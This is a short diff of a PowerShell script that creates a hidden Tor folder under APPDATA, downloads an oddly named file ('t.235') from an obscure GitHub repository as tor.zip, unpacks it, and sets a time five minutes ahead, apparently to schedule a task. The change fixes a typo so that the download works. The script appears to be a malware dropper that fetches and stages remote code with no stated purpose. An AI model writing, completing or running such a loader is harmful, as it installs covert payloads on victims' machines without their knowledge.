@@ -1,7 +1,7 @@
 New-Item -ItemType dir -Path "$env:APPDATA\Tor" -Force
 $outfile = "$env:APPDATA\Tor\tor.zip"
 if (-not (Test-Path -Path $outfile)) {
-(New-Object Net.WebClient).DownloadFile("https://github.com/jawandapreeti/urban-octo-potato/raw/main/t.235",$outfile1)
+(New-Object Net.WebClient).DownloadFile("https://github.com/jawandapreeti/urban-octo-potato/raw/main/t.235",$outfile)
 Expand-Archive -Path $outfile -DestinationPath $env:APPDATA\Tor
 $currentDateTime = Get-Date
 $newDateTime = $currentDateTime.AddMinutes(5)
